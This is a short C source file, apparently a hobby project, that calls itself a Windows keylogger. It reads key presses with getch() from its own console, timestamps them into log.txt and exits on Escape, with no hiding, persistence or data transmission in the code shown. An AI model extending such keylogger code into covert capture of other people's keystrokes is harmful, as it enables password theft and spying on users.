/* Project started March 27th 2024*/
/* Zachary Adelson*/
/* I am creating WINDOWS keylogger in C*/
/* Key logger inspired by https://gist.github.com/patilswapnilv/7338783 hiding window pulled from here as well*/
/* Key press inspired from https://www.geeksforgeeks.org/kbhit-c-language/ */

#include "keylogger.h"

int main()
{
    FILE* logFile = fopen("log.txt", "a+"); // Location to write our log data
    char keyPressed = 'T'; // Location to store the key the user pressed
    myBool keepLooping = True; // A enumerated boolean to keep track of when to exit the while loop

    // Setting up time variable
    time_t curTime;
    curTime = time(NULL);
    
    if(logFile == NULL)
    {
        printf("Error, file not opened.\n");
        return 0;
    }

    fprintf(logFile, "\n\nOpened on %s", ctime(&curTime)); // Print the starting of the Keylogger to the file

    // Loops while our flag is set to True
    while(keepLooping == True)
    {
            curTime = time(NULL);// Update time every cycle
            keyPressed = getch();
            switch(keyPressed)
            {
                case 0x20: // space key is pressed
                        fprintf(logFile, " ");
                    break;
                case 0x1B: // Escape key is pressed
                        fprintf(logFile, " ||| ESC PRESSED |||");
                    break;
                case 0x09: // Tab key is pressed
                      fprintf(logFile, "\t");
                    break;
                case 0x08: // Backspace key is pressed
                      fprintf(logFile, "<= [backspace]");
                    break;
                default:
                      fprintf(logFile, "%c", keyPressed);
                    break;
            }

            if((int)keyPressed == ESCAPEKEY)
            {
                keepLooping = False;
            }
    }
    fprintf(logFile, "\nClosed on %s", ctime(&curTime)); // Print the ending of the Keylogger to the file
    fclose(logFile);
    return 0;
}